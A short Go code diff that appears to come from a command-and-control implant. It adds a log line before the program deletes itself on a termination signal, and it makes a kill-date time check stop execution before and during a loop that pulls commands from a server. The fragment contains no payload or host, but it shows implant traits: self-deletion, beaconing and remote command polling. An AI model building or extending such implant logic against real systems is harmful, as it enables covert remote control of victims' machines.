@@ -21,18 +21,23 @@ func main() {
 	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-signalChan
+		util.Println("signal received")
 		command.DeleteSelf()
 		os.Exit(0)
 	}()
 
 	currentTime := time.Now()
 	rand.Seed(currentTime.UnixNano())
-	command.TimeCheck(currentTime)
+	if command.TimeCheck(currentTime) {
+		return
+	}
 	ok := packet.FirstBlood()
 	if ok {
 		for {
 			currentTime = time.Now()
-			command.TimeCheck(currentTime)
+			if command.TimeCheck(currentTime) {
+				return
+			}
 			resp, err := packet.PullCommand()
 			if err == nil {
 				totalLen := len(resp)
